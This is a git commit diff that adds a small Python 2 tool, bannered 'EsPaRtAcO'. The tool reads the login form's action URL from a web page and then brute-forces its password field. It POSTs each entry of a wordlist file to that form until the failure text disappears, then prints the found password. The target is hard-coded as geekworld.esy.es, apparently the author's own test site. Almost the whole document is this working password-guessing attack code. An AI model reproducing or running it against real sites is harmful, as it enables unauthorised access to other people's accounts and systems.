24c3dcc4c4e62e46ee1619b3e6d7ad3cc2c2d2e3
Omar Santiago <santiago25.10infor@gmail.com>
2017-03-04 10:44:36 -0600

    modulo

--- espartaco3.py
+++ espartaco3.py
@@ -1,14 +1,11 @@
 #! /usr/bin/python2.7
 # -*- coding: utf-8 -*-
-from mod_Espartaco import MyHTMLParser
 from mod_Espartaco import Analyze
-from subprocess import check_output,CalledProcessError
+from mod_Espartaco import MyHTMLParser
 
-o_analisis = Analyze("geekworld.esy.es", "80", "passwd")
+o_analisis = Analyze("geekworld.esy.es", "80", "phpbb.txt")
 my_html = o_analisis.recognition_test()
-#print my_html
-#result_html = str(check_output('grep a '+my_html,shell=True,universal_newlines=True))
-#print(result_html)
-parser = MyHTMLParser()
-parser.feed(my_html)
-#o_analisis.password_attack()
+o_parser = MyHTMLParser()
+o_parser.feed(my_html)
+controller = o_parser.get_controller()
+o_analisis.password_attack(controller)
---
+++ mod_Espartaco.py
@@ -0,0 +1,105 @@
+# -*- coding: utf-8 -*-
+import httplib, urllib
+from HTMLParser import HTMLParser
+
+class MyHTMLParser(HTMLParser):
+
+	controller = "";
+
+	def handle_starttag(self, tag, attrs):
+		#print tag
+		#print attrs
+		if(tag == "form"):
+			#print type(attrs)
+			i = 0;
+			for item_attr in attrs:
+				# item_attr[0] representan cado uno de los atributos del formulario
+				if(item_attr[0] == "action"):
+					#print item_attr[1]
+					#a = item_attr[1]
+					self.controller = item_attr[1]
+	
+	def get_controller(self):
+		return self.controller
+		#print "Encountered a start tag:", tag
+
+	#def handle_endtag(self, tag):
+		#print "Encountered an end tag :", tag
+
+	#def handle_data(self, data):
+		#print "Encountered some data  :", data
+
+class Analyze():
+	# atributos
+	site = "";
+	port = "";
+	conn = "";
+	headers = "";
+	password = "";
+	path_file = "";
+
+	# constructor
+	def __init__(self, p_site, p_port, p_path_file):
+		self.site = p_site;
+		self.port = p_port
+		self.path_file = p_path_file
+		print """		 _____     ____       ____  _      _         ___  
+		| ____|___|  _ \ __ _|  _ \| |_   / \   ___ / _ \ 
+		|  _| / __| |_) / _` | |_) | __| / _ \ / __| | | |
+		| |___\__ \  __/ (_| |  _ <| |_ / ___ \ (__| |_| |
+		|_____|___/_|   \__,_|_| \_\\__/_/   \_\___|\___/
+		""";
+
+	def connection(self):
+		self.headers = {"Content-type": "application/x-www-form-urlencoded","Accept": "text/plain"}
+		self.conn = httplib.HTTPConnection(self.site + ":" + self.port)
+		#print self.conn
+
+	def recognition_test(self):
+		self.connection()
+		#print self.site
+		#print self.port
+		#print self.headers
+		#print self.conn
+		params = urllib.urlencode({'password': 'pusToyDurmiendo'})
+		self.conn.request("POST", "/index.php", params, self.headers)
+		response = self.conn.getresponse()
+		ver_source = response.read()
+		return ver_source
+		#a = self.feed(ver_source)
+		#print a
+
+	def password_attack(self, prey):
+		self.connection();
+
+		f = open(self.path_file, 'r')
+		for line in f:
+			password = line[:-1]
+			params = urllib.urlencode({'password': password})
+			self.conn.request("POST", "/"+prey, params, self.headers)
+			response = self.conn.getresponse()
+			ver_source = response.read()
+			#print ver_source
+			#print password
+			#print response.status
+			print(".")
+
+			if "fuera" in ver_source:
+				pass
+			else:
+				self.password = password
+				self.print_result();
+				quit();
+				#print("SIII"); quit();
+			
+		self.conn.close()
+
+	def print_result(self):
+		print(
+        "###########################################\n"
+        "\t+ web site: " + self.site + "\n"
+        "\t+ port: " + self.port + "\n"
+        "\t+ password: " + self.password + "\n"
+        "###########################################\n"
+        );
+    
